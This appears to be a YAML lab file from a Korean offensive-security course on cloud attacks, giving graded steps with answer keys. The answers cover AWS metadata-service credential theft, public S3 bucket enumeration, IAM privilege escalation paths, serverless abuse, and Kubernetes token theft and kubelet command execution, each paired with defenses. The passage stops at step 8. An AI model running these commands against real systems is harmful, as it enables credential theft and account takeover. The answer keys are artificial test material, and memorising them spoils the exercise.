lab_id: attack-adv-nonai-week13
title: 클라우드 공격
version: non-ai
course: attack-adv-nonai
week: 13
description: AWS, Azure, GCP 등 클라우드 환경의 고유한 공격 표면을 분석하고 시뮬레이션한다. IAM 오설정, 메타데이터 서비스
  공격, S3 버킷 노출, 서버리스 공격 등을 다룬다.
difficulty: hard
duration_minutes: 120
objectives:
- 클라우드 환경의 고유한 공격 표면을 식별한다
- IAM, 스토리지, 메타데이터 서비스의 취약점을 악용한다
- 클라우드 보안 설정 검토 방법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 클라우드 환경의 공격 표면을 분석하라. AWS/Azure/GCP의 주요 공격 벡터를 MITRE ATT&CK Cloud Matrix로
    분류하라.
  hint: IAM, 스토리지, 컴퓨팅, 네트워킹, 서버리스 등 각 서비스별 공격 표면을 정리한다
  category: recon
  points: 10
  answer: echo -e '=== Cloud Attack Surface (MITRE ATT&CK Cloud) ===\n\n[Initial Access]\n-
    Stolen credentials (phishing, leaked keys)\n- SSRF to metadata service\n- Exposed
    management consoles\n\n[Privilege Escalation]\n- IAM policy misconfiguration\n-
    Role assumption chains\n- Lambda function privilege abuse\n\n[Lateral Movement]\n-
    Cross-account role assumption\n- VPC peering exploitation\n- Shared storage (S3,
    GCS) access\n\n[Data Exfiltration]\n- S3 bucket to external account\n- Snapshot
    sharing\n- DNS over VPC\n\n[Persistence]\n- IAM user/key creation\n- Lambda backdoor\n-
    EC2 instance with reverse shell\n\n[Impact]\n- Cryptomining on compute\n- Data
    destruction\n- Resource hijacking'
  answer_detail: 클라우드 공격 표면은 온프레미스와 다른 고유한 특성을 가진다. IAM은 가장 큰 공격 표면이며, 정책 오설정 하나로
    전체 계정이 장악될 수 있다. 메타데이터 서비스, 공개 스토리지, 서버리스 함수 등 클라우드 네이티브 서비스가 새로운 공격 벡터를 제공한다.
  verify:
    type: output_contains
    expect:
    - Cloud Attack Surface
    - vectors
    field: stdout
    semantic:
      intent: MITRE ATT&CK Cloud Matrix — Initial Access(자격증명 도난/SSRF→메타데이터/콘솔 노출)
        + Privesc(IAM 오설정/role chain/Lambda) + Lateral(cross-account/VPC peering/공유
        스토리지) + Exfil(S3 외부/스냅샷/DNS) + Persistence(IAM 백도어/Lambda/EC2) + Impact(crypto
        mining/destruction). MITRE TA0008 Lateral Movement.
      success_criteria:
      - Cloud Attack Surface 키워드
      - MITRE ATT&CK Cloud + 6단계
      - AWS/Azure/GCP 멀티 클라우드 맥락
      acceptable_methods:
      - MITRE ATT&CK Cloud Matrix
      - CSA Top Threats
      - AWS Threat Matrix
      negative_signs:
      - 단계 3개 이하
      - MITRE 매핑 없음
      - 단일 클라우드만
  target_vm: attacker
- order: 2
  instruction: SSRF를 통한 클라우드 메타데이터 서비스 공격을 시뮬레이션하라. AWS IMDSv1의 취약점과 임시 자격증명 탈취 과정을
    보여라.
  hint: 169.254.169.254에서 IAM 역할의 임시 자격증명을 요청하는 과정을 문서화한다
  category: exploit
  points: 10
  answer: "echo -e '=== IMDS Metadata Attack ===\\n\\n[Step 1: Discover Role]\\ncurl\
    \ http://169.254.169.254/latest/meta-data/iam/security-credentials/\\n-> Returns:\
    \ my-ec2-role\\n\\n[Step 2: Get Credentials]\\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role\\\
    n-> Returns:\\n{\\n  \"AccessKeyId\": \"ASIA...\",\\n  \"SecretAccessKey\": \"\
    xxx...\",\\n  \"Token\": \"FwoGZX...\",\\n  \"Expiration\": \"2026-04-04T12:00:00Z\"\
    \\n}\\n\\n[Step 3: Use Credentials]\\nexport AWS_ACCESS_KEY_ID=ASIA...\\nexport\
    \ AWS_SECRET_ACCESS_KEY=xxx...\\nexport AWS_SESSION_TOKEN=FwoGZX...\\naws s3 ls\
    \  # Access S3 as the EC2 role\\n\\n[IMDSv2 Defense]\\nTOKEN=$(curl \\\n     -X\
    \ PUT http://169.254.169.254/latest/api/token \\\n     -H \"X-aws-ec2-metadata-token-ttl-seconds:\
    \ 21600\")\\ncurl \\\n     -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/...\\\
    n# Requires PUT + custom header -> SSRF cannot forge this'"
  answer_detail: AWS IMDSv1은 단순 GET 요청으로 IAM 역할의 임시 자격증명을 반환하므로 SSRF에 취약하다. Capital
    One 해킹(2019)이 이 기법으로 1억 건의 고객 정보를 유출했다. IMDSv2는 PUT 요청으로 토큰을 먼저 획득해야 하므로 SSRF로
    악용이 어렵다. 모든 EC2에서 IMDSv2를 강제해야 한다.
  verify:
    type: output_contains
    expect: IMDS Metadata
    field: stdout
    semantic:
      intent: 'IMDS 메타데이터 공격 — IMDSv1: GET 169.254.169.254/latest/meta-data/iam/security-credentials/role
        → 임시 자격증명 (AccessKeyId/SecretAccessKey/Token) → aws s3 ls. Capital One 2019
        1억건. IMDSv2: PUT /latest/api/token + X-aws-ec2-metadata-token 헤더 → SSRF 위조
        불가. MITRE T1552.005.'
      success_criteria:
      - IMDS Metadata 키워드
      - 169.254.169.254 + IAM credentials 경로
      - IMDSv2 PUT 토큰 방어
      acceptable_methods:
      - IMDSv1 SSRF + IMDSv2 비교
      - Pacu IMDS 모듈
      - PMapper 분석
      negative_signs:
      - 메타데이터 IP 없음
      - v1 vs v2 차이 없음
      - Capital One 사례 없음
  target_vm: attacker
- order: 3
  instruction: S3 버킷 오설정을 탐지하라. 공개 접근 가능한 버킷을 식별하고, 데이터를 열거하는 시뮬레이션을 수행하라.
  hint: aws s3 ls, aws s3api get-bucket-acl 등의 명령으로 버킷 권한을 확인한다
  category: recon
  points: 10
  answer: 'echo -e ''=== S3 Bucket Misconfiguration ===\n\n[Enumeration]\naws s3 ls
    s3://target-bucket --no-sign-request\naws s3 cp s3://target-bucket/sensitive.txt
    . --no-sign-request\n\n[Common Misconfigurations]\n1. Public read: Anyone can
    list and download\n2. Public write: Anyone can upload/overwrite\n3. Authenticated
    users: Any AWS account can access\n4. Public ACL on specific objects\n\n[Discovery
    Methods]\n1. DNS brute-force: bucket-name.s3.amazonaws.com\n2. Google dork: site:s3.amazonaws.com
    "index of"\n3. Certificate transparency: S3 custom domains\n4. GitHub search:
    s3://company-name\n\n[Tools]\n- S3Scanner: Automated bucket discovery\n- bucket-finder:
    Brute-force bucket names\n- aws s3api get-bucket-policy: Check policy\n\n[Defense]\n-
    S3 Block Public Access (account-level)\n- Bucket policies with explicit deny\n-
    CloudTrail logging for S3 access\n- AWS Config rules for compliance'''
  answer_detail: S3 버킷 오설정은 클라우드에서 가장 흔한 데이터 유출 원인이다. --no-sign-request로 인증 없이 접근
    가능한 버킷이 여전히 다수 존재한다. 2017년 미국 국방부, 2019년 Capital One 등 대형 사고가 S3 오설정에서 비롯되었다.
    Account-level Block Public Access가 가장 효과적인 방어이다.
  verify:
    type: output_contains
    expect: S3 Bucket
    field: stdout
    semantic:
      intent: 'S3 버킷 오설정 — aws s3 ls s3://target --no-sign-request + aws s3 cp. 오설정:
        public read/write + Authenticated users + 객체 ACL. 발견: DNS brute + Google dork
        (site:s3.amazonaws.com) + CT logs + GitHub. 도구: S3Scanner/bucket-finder. 방어:
        Block Public Access 계정 수준 + bucket policy explicit deny + CloudTrail. MITRE
        T1530.'
      success_criteria:
      - S3 Bucket 키워드
      - 오설정 3개 이상
      - 발견 방법 + 방어 (Block Public Access)
      acceptable_methods:
      - aws s3 + --no-sign-request
      - S3Scanner 자동
      - GrayhatWarfare S3 search
      negative_signs:
      - 오설정 1개 이하
      - 발견 방법 없음
      - Block Public Access 누락
  target_vm: attacker
- order: 4
  instruction: AWS IAM 권한 상승 경로를 분석하라. 과도한 IAM 정책을 악용한 권한 확대 시나리오를 문서화하라.
  hint: iam:CreatePolicyVersion, iam:AttachUserPolicy, sts:AssumeRole 등의 위험한 권한을 분석한다
  category: exploit
  points: 10
  answer: 'echo -e ''=== AWS IAM Privilege Escalation ===\n\n[21 Known IAM Privesc
    Paths (Rhino Security)]\n\n1. iam:CreatePolicyVersion\n   - Create new version
    of managed policy\n   - Set as default -> gain any permission\n\n2. iam:AttachUserPolicy\n   -
    Attach AdministratorAccess to self\n\n3. iam:PutUserPolicy\n   - Add inline policy
    with full access\n\n4. iam:CreateLoginProfile\n   - Create console password for
    another user\n\n5. iam:UpdateLoginProfile\n   - Reset another user password\n\n6.
    sts:AssumeRole\n   - Assume more privileged role\n\n7. lambda:CreateFunction +
    iam:PassRole\n   - Create Lambda with admin role\n   - Execute function -> admin
    access\n\n8. ec2:RunInstances + iam:PassRole\n   - Launch EC2 with admin instance
    profile\n   - SSH to instance -> admin via IMDS\n\n[Tool]\n- PACU: AWS exploitation
    framework\n- enumerate-iam: Brute-force IAM permissions\n- Cloudsplaining: IAM
    policy analysis'''
  answer_detail: AWS IAM 권한 상승은 Rhino Security Labs가 정리한 21개 이상의 경로가 있다. iam:CreatePolicyVersion은
    기존 정책의 새 버전을 생성하여 전체 관리자 권한을 부여할 수 있고, lambda:CreateFunction + iam:PassRole은 Lambda를
    통해 관리자 역할을 행사할 수 있다. PACU는 AWS 공격 자동화 프레임워크이다.
  verify:
    type: output_contains
    expect: IAM Privilege Escalation
    field: stdout
    semantic:
      intent: 'AWS IAM Privesc — Rhino Security 21+ 경로: iam:CreatePolicyVersion (새
        버전 default) + AttachUserPolicy (Admin attach) + PutUserPolicy (inline) + CreateLoginProfile
        + UpdateLoginProfile + sts:AssumeRole + lambda:CreateFunction+iam:PassRole
        + ec2:RunInstances+iam:PassRole. 도구: PACU + enumerate-iam + Cloudsplaining.
        MITRE T1098.'
      success_criteria:
      - IAM Privilege Escalation 키워드
      - 권한 경로 5개 이상
      - PACU 또는 도구 언급
      acceptable_methods:
      - Rhino Security 21 paths
      - PACU iam_privesc_scan
      - PMapper 그래프
      negative_signs:
      - 경로 3개 이하
      - 도구 없음
      - PassRole 누락
  target_vm: attacker
- order: 5
  instruction: 클라우드 환경에서의 측면 이동을 분석하라. Cross-account role assumption과 VPC 피어링을 통한
    이동 기법을 설명하라.
  hint: sts:AssumeRole로 다른 계정에 접근하고, VPC 피어링으로 네트워크를 횡단한다
  category: exploit
  points: 10
  answer: 'echo -e ''=== Cloud Lateral Movement ===\n\n[Cross-Account Access]\naws
    sts assume-role --role-arn arn:aws:iam::ACCOUNT_B:role/CrossAccountRole --role-session-name
    attacker\n-> Temporary credentials for Account B\n\n[VPC Peering]\n- Peered VPCs
    share network connectivity\n- Security groups may allow peered VPC traffic\n-
    Pivot from compromised VPC to peered VPC\n\n[Service-Level Movement]\n- Lambda
    -> RDS: Shared VPC, read database\n- EC2 -> S3: Instance profile permissions\n-
    ECS -> Secrets Manager: Task role access\n\n[Multi-Cloud Pivot]\n- AWS -> Azure
    via federated identity\n- GCP -> AWS via OIDC federation\n\n[Kubernetes]\n- Pod
    -> Service Account -> Cloud IAM\n- IRSA (IAM Roles for Service Accounts)\n- Pod
    escape -> Node EC2 instance role\n\n[Detection]\n- CloudTrail: AssumeRole from
    unusual accounts\n- VPC Flow Logs: Unexpected cross-VPC traffic\n- GuardDuty:
    Anomalous API calls'''
  answer_detail: 클라우드 측면 이동은 IAM 역할, 네트워크 연결, 서비스 통합을 통해 이루어진다. Cross-account role
    assumption은 조직 내 다른 AWS 계정으로 접근하는 합법적 메커니즘이지만, 과도한 신뢰 관계 설정 시 전체 조직으로 확산될 수 있다.
    쿠버네티스 Pod에서 노드의 인스턴스 프로파일로 탈출하는 기법도 중요하다.
  verify:
    type: output_contains
    expect:
    - Cloud Lateral Movement
    - AssumeRole
    field: stdout
    semantic:
      intent: '클라우드 측면 이동 — Cross-Account: aws sts assume-role + VPC peering 보안그룹
        트래픽 허용 + Service-Level (Lambda→RDS, EC2→S3, ECS→Secrets) + Multi-Cloud (federated
        identity, OIDC) + Kubernetes (Pod SA → IRSA → Cloud IAM, Pod escape → Node
        EC2 IMDS). 탐지: CloudTrail AssumeRole + VPC Flow Logs + GuardDuty.'
      success_criteria:
      - Cloud Lateral Movement 또는 AssumeRole 키워드
      - 이동 패턴 4개 이상
      - 탐지 (CloudTrail/GuardDuty) 명시
      acceptable_methods:
      - sts assume-role + VPC peering
      - Pacu cross-account
      - PMapper transitive
      negative_signs:
      - 패턴 2개 이하
      - K8s 누락
      - 탐지 없음
  target_vm: attacker
- order: 6
  instruction: 서버리스(Lambda/Functions) 환경의 공격을 분석하라. 함수 코드 주입, 환경변수 탈취, 의존성 공격을 설명하라.
  hint: Lambda 함수의 환경변수에 시크릿이 저장되는 패턴과 공격 방법을 다룬다
  category: exploit
  points: 10
  answer: echo -e '=== Serverless Attack Vectors ===\n\n[1] Environment Variable Leakage\naws
    lambda get-function-configuration --function-name target\n-> Returns environment
    variables (often contains secrets)\n\n[2] Code Injection\n- Event data used in
    system commands\n- SQL injection via Lambda to RDS\n- Template injection in response
    rendering\n\n[3] Dependency Attacks\n- Lambda layers with malicious packages\n-
    Vulnerable dependencies in deployment package\n\n[4] Execution Role Abuse\naws
    sts get-caller-identity\n-> Shows Lambda execution role\n-> May have excessive
    permissions\n\n[5] Cold Start Exploitation\n- /tmp directory persists between
    invocations\n- Previous execution data may be accessible\n\n[6] Event Injection\n-
    Craft malicious events (S3, SNS, API Gateway)\n- Trigger Lambda with attacker-controlled
    input\n\n[Defense]\n- Minimal IAM permissions per function\n- Secrets Manager
    instead of env vars\n- Input validation in all event handlers\n- Regular dependency
    scanning'
  answer_detail: 서버리스 환경은 전통적인 서버 공격과 다른 공격 표면을 가진다. 환경변수에 시크릿을 저장하는 것은 흔하지만 위험하며,
    실행 역할의 과도한 권한은 전체 AWS 계정 장악으로 이어질 수 있다. /tmp 디렉토리의 잔존 데이터와 Cold Start 사이의 상태 공유도
    보안 위험이다.
  verify:
    type: output_contains
    expect: Serverless Attack
    field: stdout
    semantic:
      intent: 'Serverless 공격 — [1] Env vars 시크릿 (aws lambda get-function-configuration)
        + [2] Code Injection (event 데이터→system 명령/SQLi) + [3] Dependency 공격 (Layers/패키지)
        + [4] Execution Role 남용 (sts get-caller-identity) + [5] Cold Start /tmp 잔존
        + [6] Event Injection (S3/SNS/API Gateway). 방어: 최소 IAM + Secrets Manager +
        입력 검증 + 의존성 스캔. OWASP Serverless Top 10.'
      success_criteria:
      - Serverless Attack 키워드
      - 공격 4개 이상
      - Secrets Manager + 최소 IAM 방어
      acceptable_methods:
      - Lambda 환경변수 + IAM role
      - Pacu lambda 모듈
      - checkov serverless 스캔
      negative_signs:
      - 공격 2개 이하
      - Cold Start 누락
      - 방어 없음
  target_vm: attacker
- order: 7
  instruction: Kubernetes 환경의 공격을 분석하라. Pod 탈출, Service Account 토큰 탈취, etcd 접근 등을
    설명하라.
  hint: kubectl, 서비스 어카운트 토큰, etcd API를 통한 클러스터 장악을 다룬다
  category: exploit
  points: 10
  answer: "echo -e '=== Kubernetes Attack Vectors ===\\n\\n[1] Pod Escape\\n- Privileged\
    \ container: nsenter to host\\n- hostPID/hostNetwork: Access host resources\\\
    n- Mount /var/run/docker.sock: Container breakout\\n\\n[2] Service Account Token\\\
    ncat /var/run/secrets/kubernetes.io/serviceaccount/token\\nkubectl --token=\\\
    $TOKEN get secrets --all-namespaces\\n\\n[3] etcd Direct Access\\ncurl https://etcd:2379/v3/kv/range\
    \ \\\n     -d \\'{}\\' --cert ...\\n-> Contains all cluster secrets in plaintext\\\
    n\\n[4] Kubelet API\\ncurl -sk https://node:10250/pods\\ncurl -sk https://node:10250/run/namespace/pod/container\
    \ \\\n     -d \"cmd=id\"\\n\\n[5] Cloud Provider Escalation\\ncurl http://169.254.169.254/latest/meta-data/\\\
    n-> EC2 instance role from within Pod\\n\\n[Defense]\\n- Pod Security Standards\
    \ (restricted)\\n- RBAC with least privilege\\n- Network policies for pod isolation\\\
    n- etcd encryption at rest\\n- OPA/Gatekeeper admission control'"
  answer_detail: Kubernetes는 컨테이너 오케스트레이션의 복잡성으로 인해 다양한 공격 경로를 제공한다. 특권 Pod에서 호스트로
    탈출하고, Service Account 토큰으로 클러스터 API에 접근하며, etcd에서 모든 시크릿을 읽을 수 있다. Pod Security
    Standards, RBAC, Network Policy의 3중 방어가 필수적이다.
  verify:
    type: output_contains
    expect:
    - Kubernetes Attack
    - Kubernetes
    field: stdout
    semantic:
      intent: 'Kubernetes 공격 — [1] Pod Escape (privileged + nsenter / hostPID-hostNetwork
        / docker.sock) + [2] SA Token (cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        + [3] etcd 직접 접근 (curl https://etcd:2379, 평문 시크릿) + [4] Kubelet API (10250
        port) + [5] Cloud Provider Escalation (Pod → IMDS → Node EC2 role). 방어: Pod
        Security Standards (restricted) + RBAC + Network Policies + etcd encryption
        + OPA/Gatekeeper. MITRE T1611 Escape to Host.'
      success_criteria:
      - Kubernetes Attack 키워드
      - 공격 4개 이상
      - 방어 (PSS + RBAC + NetworkPolicy)
      acceptable_methods:
      - kubectl 도구 + Peirates
      - kubelet API 직접
      - Trivy/kube-bench 평가
      negative_signs:
      - 공격 2개 이하
      - etcd 누락
      - PSS/RBAC 누락
  target_vm: attacker
- order: 8
  instruction: 클라우드 자격증명 유출 경로를 분석하라. GitHub, CI/CD, 메타데이터, 로그 등에서 자격증명이 노출되는 패턴을
    정리하라.
  hint: AWS Access Key가 유출되는 주요 경로와 자동 탐지 방법을 다룬다
